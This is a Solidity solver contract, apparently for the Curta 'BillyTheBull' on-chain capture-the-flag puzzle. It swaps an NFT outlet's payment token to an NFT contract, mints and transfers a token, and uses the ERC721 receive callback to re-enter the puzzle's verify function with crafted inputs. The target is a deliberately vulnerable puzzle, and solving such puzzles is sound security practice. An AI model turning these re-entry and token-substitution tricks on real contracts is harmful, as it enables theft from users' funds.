// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {ICurta} from "../src/interfaces/ICurta.sol";
import {IPuzzle} from "../src/interfaces/IPuzzle.sol";
import {INFTOutlet} from "../src/interfaces/INFTOutlet.sol";
import {BillyTheBull} from "../src/BillyTheBull.sol";
import {IERC721} from "./interfaces/IERC721.sol";
import {ERC721TokenReceiver} from "solmate/tokens/ERC721.sol";

abstract contract IFreeWilly is IERC721 {
    function mint(uint256 id) external virtual;
}

contract BillySolver is ERC721TokenReceiver {
    address public owner;

    address public immutable self;

    bool public flipper = false;

    uint256 public constant start =
        0xc92f25d7aa4cc2a3b31b55e9e9c7c78283a420fa26d964c8afc338496a418b11;
    ICurta public constant CURTA =
        ICurta(0x0000000006bC8D9e5e9d436217B88De704a9F307);
    BillyTheBull public constant PUZZLE =
        BillyTheBull(0x9C48aE1Ae4C1a8BACcA3a52AEb22657FA0a52D3B);
    INFTOutlet public constant NFT_OUTLET =
        INFTOutlet(0xf9F656435493C58421cFe153E5936f0FafF8c05f);
    IFreeWilly public constant FREE_WILLY =
        IFreeWilly(0xe5608a36489Fe45a8f08fD0c6B028801cE6B38d1);

    // eoa.sina.eth
    address public constant SINA_ETH_EOA =
        0x2de14DB256Db2597fe3c8Eed46eF5b20bA390823;
    uint16 public constant SINA_ETH_EOA_NONCE = 1405;

    // logic from https://ethereum.stackexchange.com/questions/24248/how-to-calculate-an-ethereum-contracts-address-during-its-creation-using-the-so.
    bytes public constant FLAG =
        abi.encodePacked(
            bytes1(0xd8),
            bytes1(0x94),
            SINA_ETH_EOA,
            bytes1(0x82),
            uint16(SINA_ETH_EOA_NONCE)
        );

    constructor() {
        self = address(this);
        FREE_WILLY.setApprovalForAll(address(NFT_OUTLET), true);
    }

    function getMagicFlag() public returns (bytes memory flag) {
        address origOwner = owner;
        owner = address(this);
        NFT_OUTLET.changePaymentToken(
            address(0xe5608a36489Fe45a8f08fD0c6B028801cE6B38d1)
        );
        uint256 id = PUZZLE.nftPrice();
        FREE_WILLY.mint(id);
        FREE_WILLY.transferFrom(address(this), self, id);
        owner = origOwner;
        if (flipper) {
            return abi.encode(block.number);
        }
        flipper = true;
        return FLAG;
    }

    function getSoln() public pure returns (uint256) {
        return uint256(keccak256(FLAG));
    }

    function onERC721Received(
        address,
        address,
        uint256 id,
        bytes calldata
    ) external override returns (bytes4) {
        // FREE_WILLY.mint(uint256(block.hash));
        uint tokenId1 = start >> 128;
        uint tokenId2 = uint(uint128(start));
        if (id != tokenId2) {
            try
                PUZZLE.verify(
                    (tokenId2 << 128) | tokenId1,
                    uint256(keccak256(FLAG))
                )
            {} catch {}
        }
        return ERC721TokenReceiver.onERC721Received.selector;
    }
}
